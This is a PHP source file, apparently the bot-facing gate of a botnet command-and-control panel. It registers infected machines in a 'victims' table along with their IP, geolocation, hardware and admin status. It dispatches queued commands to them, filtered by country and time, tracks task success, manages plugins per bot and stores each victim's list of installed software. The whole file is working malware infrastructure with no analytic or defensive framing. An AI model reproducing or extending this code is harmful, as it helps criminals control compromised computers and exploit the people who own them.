<?php

  //$myFile = "requestslog.txt";
   // $fh = fopen($myFile, 'a') or die("can't open file");
   // fwrite($fh, "\r\n\r\n---------------------------------------------------------------\r\n");
   // foreach($_SERVER as $h=>$v)
   //     if(ereg('HTTP_(.+)',$h,$hp))
   //         fwrite($fh, "$h = $v\r\n");
    //fwrite($fh, "\r\n");
    //fwrite($fh, file_get_contents('php://input'));
    //fclose($fh);

$object = new Authentication();
$object->main();

class Authentication
{
    private $MySQL;
    private $Global;

    public function __construct()
    {
        require_once('config.php');
        require_once('classes/mysql.class.php');

        $this->MySQL = new MySQL(HOST, USER, PASS, DB);
    }

    public function main()
    {
        if (isset($_GET[GET_PARAM_MODE]) && isset($_POST[POST_PARAM_GUID])) {
            $this->Global = array('guid' => $this->MySQL->escapeString($_POST[POST_PARAM_GUID]), 'ip' => $this->MySQL->escapeString($_POST[POST_PARAM_IP]), 'time' => time());

            switch ($_GET[GET_PARAM_MODE]) {
                case BOT_MODE_INSERT:
                    $this->insertData();
                    echo $this->updateData();

                    break;
                case BOT_MODE_UPDATE:
                    if ($this->existGUID($this->Global['guid'])) {
                        echo $this->updateData();
                    }

                    break;
                case BOT_MODE_EXECUTED:
                    if ($this->existGUID($this->Global['guid'])) {
                        $this->executeStatus();
                    }

                    break;
                case BOT_MODE_RUNPLUGIN:
                    if ($this->existGUID($this->Global['guid'])) {
                        $this->runPlugin();
                    }

                    break;
                case BOT_MODE_INSTALLPLUGIN:
                    if ($this->existGUID($this->Global['guid'])) {
                        $this->installPlugin();
                    }

                    break;
                case BOT_MODE_DEINSTALLPLUGIN:
                    if ($this->existGUID($this->Global['guid'])) {
                        $this->deinstallPlugin();
                    }
					break;
                case BOT_MODE_DEBUG:
                    if ($this->existGUID($this->Global['guid'])) {
                        $this->debuginfo();
                    }
					break;
                case BOT_MODE_INSTALLATIONLIST:
                    if ($this->existGUID($this->Global['guid'])) {
                        $this->installationlist();
                    }
					break;
            }
        }
    }

    public function insertData()
    {
        include('inc/geo/geoipcity.inc');

        $gi = geoip_open('inc/geo/geolitecity.dat', GEOIP_STANDARD);
        $record = geoip_record_by_addr($gi, $this->Global['ip']);
		
		if ($record) {		
			$code = $record->country_code;
			$name = $record->country_name;
		
			if(array_key_exists($record->country_code, $GEOIP_REGION_NAME) && array_key_exists($record->region, $GEOIP_REGION_NAME[$record->country_code])) {
				$region = $GEOIP_REGION_NAME[$record->country_code][$record->region];
			} else {
				$region = 'Unknown';
			}
        
			$city = $record->city;
		}
		geoip_close($gi);
		
        $code = empty($code) ? '00' : strtolower($code);
        $name = empty($name) ? 'Unknown' : $name;
        $region = empty($region) ? 'Unknown' : $region;
        $city = empty($city) ? 'Unknown' : $city;

        $data = array('buildid' => $_POST[POST_PARAM_BUILDID], 'pc' => $_POST[POST_PARAM_PC], 'os' => $_POST[POST_PARAM_OS], 'admin' => $_POST[POST_PARAM_ADMIN], 'cpu' => $_POST[POST_PARAM_CPU], 'gpu' => $_POST[POST_PARAM_GPU]);

        foreach ($data as $key => $value) {
            if (empty($data[$key])) {
            }
            $data[$key] = $this->MySQL->escapeString($data[$key]);
        }

         if ($this->existGUID($this->Global['guid'])) {
            $this->MySQL->doQuery('UPDATE `victims` set `BuildID` = \'' . $data['buildid'] . '\', `Connected` = \'' . $this->Global['time'] . '\'  where `GUID` = UNHEX(\'' . $this->Global['guid'] . '\');');
        } else {
            $this->MySQL->doQuery('INSERT INTO `victims` (`GUID`, `BuildID`, `Connected`, `PCName`, `OS`, `Admin`, `IP`, `Country`, `CountryLong`, `Region`, `City`, `Time`, `creationDate`, `CPUName`, `GPUName`) VALUES (UNHEX(\'' . $this->Global['guid'] . '\'), \'' . $data['buildid'] . '\', \'' . $this->Global['time'] . '\', \'' . $data['pc'] . '\', \'' . $data['os'] . '\', \'' . $data['admin'] . '\', \'' . $this->Global['ip'] . '\', \'' . $code . '\', \'' . $name . '\', \'' . $region . '\', \'' . $city . '\', \'' . $this->Global['time'] . '\', NOW(), \'' . $data['cpu'] . '\', \'' . $data['gpu'] . '\')');

        }
    }

    public function updateData()
    {
        $this->MySQL->doQuery('UPDATE `victims` SET Time = \'' . $this->Global['time'] . '\', IP = \'' . $this->Global['ip'] . '\', Online = \'1\' WHERE GUID = UNHEX(\'' . $this->Global['guid'] . '\')');

        if ($this->isBotFree($this->Global['guid'])) {
            return $this->getNewTask();
        } else {
            return $this->isTaskExpired($this->Global['guid']);
        }
    }

    public function executeStatus()
    {
        $executed = $_POST[POST_PARAM_EXECUTED] == 'y' ? true : false;
        $taskid = $this->MySQL->escapeString((int)$_POST[POST_PARAM_TASKID]);

        //$this->MySQL->doQuery('SELECT GUIDs FROM tasks WHERE ID = \'' . $taskid . '\' AND GUIDs LIKE \'%' . $this->Global['guid'] . '%\'');
        //$task = $this->MySQL->arrayResult();

        if ($executed) {
            $this->MySQL->doQuery('UPDATE tasks SET Executed = Executed + 1 WHERE ID = \'' . $taskid . '\'');
            //$NewGUIDs = str_replace($this->Global['guid'], $this->Global['guid'] . '|E', $task['GUIDs']);
			$this->MySQL->doQuery('UPDATE tasks_victims SET success = 1, executed = 1 WHERE TaskId = \'' . $taskid . '\' AND GUID = UNHEX(\'' . $this->Global['guid'] . '\')');
        } else {
            $this->MySQL->doQuery('UPDATE tasks SET Fails = Fails + 1 WHERE ID = \'' . $taskid . '\'');
            $this->MySQL->doQuery('UPDATE victims SET Free = \'1\', TaskID = \'0\' WHERE GUID = UNHEX(\'' . $this->Global['guid'] . '\')');
            //$NewGUIDs = str_replace($this->Global['guid'], $this->Global['guid'] . '|F', $task['GUIDs']);
			$this->MySQL->doQuery('UPDATE tasks_victims SET failed = 1, executed = 1 WHERE TaskId = \'' . $taskid . '\' AND GUID = UNHEX(\'' . $this->Global['guid'] . '\')');
        }

        //$this->MySQL->doQuery('UPDATE tasks SET GUIDs = \'' . $NewGUIDs . '\' WHERE ID = \'' . $taskid . '\'');
    }

    public function runPlugin()
    {
        require_once('classes/plugin.class.php');
        $PluginObject = new Plugin;

        if ($PluginObject->isPluginInstalled($_POST[POST_PARAM_PLUGINNAME])) {
            if (file_exists('plugins/' . $_POST[POST_PARAM_PLUGINNAME] . '/main.php')) {
                require_once('plugins/' . $_POST[POST_PARAM_PLUGINNAME] . '/main.php');
                $plugin_object = new main;
                $plugin_object->insertData();
            }
        }
    }

    public function installPlugin()
    {
        $plugin = $this->MySQL->escapeString($_POST[POST_PARAM_PLUGINNAME]);

        //require_once('classes/plugin.class.php');
        //$Plugin = new Plugin;

        //if($Plugin->isPluginInstalled($plugin)) {
        $this->MySQL->doQuery('SELECT * FROM plugins WHERE GUID = UNHEX(\'' . $this->Global['guid'] . '\') AND plugin = \'' . $plugin . '\'');

        if (!$this->MySQL->numResult()) {
            $this->MySQL->doQuery('INSERT INTO `plugins` (`GUID`, `Plugin`) VALUES (UNHEX(\'' . $this->Global['guid'] . '\'), \'' . $plugin . '\')');
        }
        //}
    }

    public function deinstallPlugin()
    {
        $plugin = $this->MySQL->escapeString($_POST[POST_PARAM_PLUGINNAME]);

        $this->MySQL->doQuery('SELECT * FROM plugins WHERE GUID = UNHEX(\'' . $this->Global['guid'] . '\')');

        if ($this->MySQL->numResult()) {
            $this->MySQL->doQuery('DELETE FROM plugins WHERE GUID = UNHEX(\'' . $this->Global['guid'] . '\') AND Plugin = \'' . $plugin . '\'');
        }
    }

	
	public function debuginfo()
	{
		$debugMessage = $this->MySQL->escapeString($_POST[POST_PARAM_DEBUGMESSAGE]);
		$this->MySQL->doQuery('INSERT INTO `debuglog` (`GUID`, `message`, `creationDate`) VALUES (UNHEX(\'' . $this->Global['guid'] . '\'), \'' . $debugMessage . '\', NOW())');
	}
	
	public function installationlist()
	{
		$installationList = $this->MySQL->escapeString($_POST[POST_PARAM_INSTALLATIONLIST]);
		
		$this->MySQL->doQuery('DELETE FROM plugin_software WHERE GUID = \'' . $this->Global['guid'] . '\'');
		$this->MySQL->doQuery('INSERT INTO `plugin_software` (`GUID`, `software`, `creationDate`) VALUES (UNHEX(\'' . $this->Global['guid'] . '\'), \'' . $installationList . '\', NOW())');
	}
	
    private function getNewTask()
    {
        $command = '';

        //Specified GUID - Over time
        $this->MySQL->doQuery('SELECT * FROM tasks WHERE SpecGUID = \'' . $this->Global['guid'] . '\' AND (Count <> Received OR Count = \'0\') AND Stop <> 0 LIMIT 0, 1');

        if ($this->MySQL->numResult()) {
            $task = $this->MySQL->arrayResult();

            if ($task['Start'] <= $this->Global['time'] && $task['Stop'] >= $this->Global['time']) {
                $command = $task['ID'] . '|' . $task['Command'] . '|' . $task['Parameter'];
                $this->MySQL->doQuery('UPDATE victims SET Free = \'0\', TaskID = \'' . $task['ID'] . '\' WHERE GUID = UNHEX(\'' . $this->Global['guid'] . '\')');
                $this->MySQL->doQuery('UPDATE tasks SET Received = Received + 1 WHERE ID = \'' . $task['ID'] . '\'');
            }

            return $command;
        }

		//$this->MySQL->doQuery('SELECT ID FROM tasks_victims WHERE TaskId = \'' . $task['ID'] . '\' AND GUID = UNHEX(\'' . $this->Global['guid'] . \')');
		//check user has already this task?
		
        //$this->MySQL->doQuery('SELECT * FROM tasks WHERE SpecGUID = \'\' AND GUIDs NOT LIKE \'%' . $this->Global['guid'] . '%\' AND (Count <> Received OR Count = \'0\') AND Stop = \'0\' AND (Countries LIKE \'%' . $this->getCountryName($this->Global['guid']) . '%\' OR Countries = \'\') LIMIT 0, 1');
		$this->MySQL->doQuery('SELECT * FROM tasks WHERE SpecGUID = \'\' AND NOT EXISTS (SELECT TaskId FROM tasks_victims where tasks.ID = tasks_victims.TaskId AND GUID = UNHEX(\'' . $this->Global['guid'] . '\')) AND (Count <> Received OR Count = \'0\') AND Stop = \'0\' AND (Countries LIKE \'%' . $this->getCountryName($this->Global['guid']) . '%\' OR Countries = \'\') LIMIT 0, 1');

        if ($this->MySQL->numResult()) {
            $task = $this->MySQL->arrayResult();
            $command = $task['ID'] . '|' . $task['Command'] . '|' . $task['Parameter'];
            //$this->MySQL->doQuery('UPDATE tasks SET GUIDs = CONCAT(GUIDs, \'' . $this->Global['guid'] . ',\'), Received = Received + 1 WHERE ID = \'' . $task['ID'] . '\'');
			$this->clientHasNewTask($task['ID'], $this->Global['guid']);
		} else {
            $this->cleanOverTimeTask();

            $this->MySQL->doQuery('SELECT * FROM tasks WHERE SpecGUID = \'\' AND NOT EXISTS (SELECT TaskId FROM tasks_victims where tasks.ID = tasks_victims.TaskId AND GUID = UNHEX(\'' . $this->Global['guid'] . '\')) AND (Count <> Received OR Count = \'0\') AND Stop <> 0 AND (Countries LIKE \'%' . $this->getCountryName($this->Global['guid']) . '%\' OR Countries = \'\') LIMIT 0, 1');
            if ($this->MySQL->numResult()) {
                $task = $this->MySQL->arrayResult();
                if ($task['Start'] <= $this->Global['time'] && $task['Stop'] >= $this->Global['time']) {
                    $command = $task['ID'] . '|' . $task['Command'] . '|' . $task['Parameter'];
                    $this->MySQL->doQuery('UPDATE victims SET Free = \'0\', TaskID = \'' . $task['ID'] . '\' WHERE GUID = UNHEX(\'' . $this->Global['guid'] . '\')');
                    //$this->MySQL->doQuery('UPDATE tasks SET GUIDs = CONCAT(GUIDs, \'' . $this->Global['guid'] . ',\'), Received = Received + 1 WHERE ID = \'' . $task['ID'] . '\'');
					$this->clientHasNewTask($task['ID'], $this->Global['guid']);

                }
            }
        }

        return $command;
    }
	
	private function clientHasNewTask($taskId, $vicGuid)
	{
		$this->MySQL->doQuery('UPDATE tasks SET Received = Received + 1 WHERE ID = \'' . $taskId . '\'');
		$this->MySQL->doQuery('INSERT IGNORE INTO `tasks_victims` (`GUID`, `TaskId`) VALUES (UNHEX(\'' . $vicGuid . '\'), \'' . $taskId . '\')');
	}

    private function isTaskExpired($guid)
    {
        $this->MySQL->doQuery('SELECT TaskID FROM victims WHERE GUID = UNHEX(\'' . $guid . '\')');
        $victim = $this->MySQL->arrayResult();
        $TaskID = $victim['TaskID'];

        $this->MySQL->doQuery('SELECT * FROM tasks WHERE ID = \'' . $victim['TaskID'] . '\'');
        $victim = $this->MySQL->arrayResult();

        if ($victim['Stop'] <= $this->Global['time']) {
            if ($victim['SpecGUID'] == $guid) {
                $this->MySQL->doQuery('DELETE FROM tasks WHERE ID = \'' . $TaskID . '\'');
            }

            $this->MySQL->doQuery('UPDATE `victims` SET Free = \'1\', TaskID = \'0\' WHERE GUID = UNHEX(\'' . $guid . '\')');

            return 'STOP';
        }
    }

    private function cleanOverTimeTask()
    {
        $this->MySQL->doQuery('SELECT * FROM tasks WHERE Stop > \'' . time() . '\' AND Stop <> 0');
        while ($row = $this->MySQL->arrayResult()) {
            $query = mysql_query('SELECT * FROM victims WHERE TaskID = \'' . $row['ID'] . '\' AND Online = \'0\'');

            if (mysql_num_rows($query)) {
                $number = mysql_num_rows($query);

                mysql_query('UPDATE `victims` SET TaskID = \'0\', Free = \'1\' WHERE TaskID = \'' . $row['ID'] . '\' AND Online = \'0\'');
                $query = mysql_query('SELECT * FROM tasks WHERE ID = \'' . $row['ID'] . '\'');
                $task = mysql_fetch_array($query);
                mysql_query('UPDATE `tasks` SET Executed = Executed - ' .  $number . ', Received = Received - ' . $number . ' WHERE ID = \'' . $row['ID'] . '\'');
            }
        }
    }

    private function isBotFree($guid)
    {
        $this->MySQL->doQuery('SELECT TaskID FROM victims WHERE GUID = UNHEX(\'' . $guid . '\') AND Free = \'1\'');
        return $this->MySQL->numResult() ? true : false;
    }

    private function existGUID($guid)
    {
        $this->MySQL->doQuery('SELECT GUID FROM victims WHERE GUID = UNHEX(\'' . $guid . '\')');
        return $this->MySQL->numResult() ? true : false;
    }

    private function getCountryName($guid)
    {
        $this->MySQL->doQuery('SELECT Country FROM victims WHERE GUID = UNHEX(\'' . $guid . '\')');
        $victim = $this->MySQL->arrayResult();
        return strtolower($victim['Country']);
    }
}